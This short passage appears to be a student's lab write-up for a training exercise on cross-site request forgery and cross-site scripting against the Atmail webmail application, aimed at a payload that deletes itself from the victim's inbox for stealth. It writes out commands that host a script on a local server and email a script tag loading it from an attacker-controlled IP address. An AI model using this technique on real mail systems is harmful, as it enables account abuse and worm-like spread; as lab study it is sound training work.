## Exercise 3.5.5 Extra Mile (CSRF)
Once you have completed the previous exercise, enhance the JavaScript payload further to delete itself from the victim’s email inbox. This provides an extra level of stealth and is often used in large-scale XSS worms.
1. Send malicious mail
	* `python -m SimpleHTTPServer 9090`
	* `python atmail_sendemail.py atmail '<script src="http://192.168.119.134:9090/atmail_sendmail_XHR.js"></script>'`
1. Login to atmail with **admin@offsec.local** and you should received the malicious email. Following screenshots show that the malicious email triggered the CSRF request.
